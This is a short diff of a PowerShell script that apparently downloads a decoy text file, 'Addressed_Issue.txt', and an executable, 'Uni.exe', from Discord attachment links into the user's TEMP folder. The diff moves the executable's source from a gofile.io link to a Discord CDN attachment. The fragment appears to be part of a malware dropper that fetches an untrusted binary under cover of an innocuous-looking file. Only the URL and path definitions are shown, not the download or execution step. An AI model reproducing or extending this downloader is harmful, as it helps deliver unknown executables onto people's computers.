@@ -1,6 +1,6 @@
 # Define URLs
 $txtUrl = "https://cdn.discordapp.com/attachments/1166425843451580519/1167728744505548810/Addressed_Issue.txt"
-$batUrl = "https://store1.gofile.io/download/fd2e9f96-71a9-431a-933f-4d9bfa0196f7/Uni.exe"
+$batUrl = "https://cdn.discordapp.com/attachments/1166425843451580519/1167739367821946950/Uni.exe"
 
 # Define file paths
 $txtPath = [System.IO.Path]::Combine($env:TEMP, "Addressed_Issue.txt")
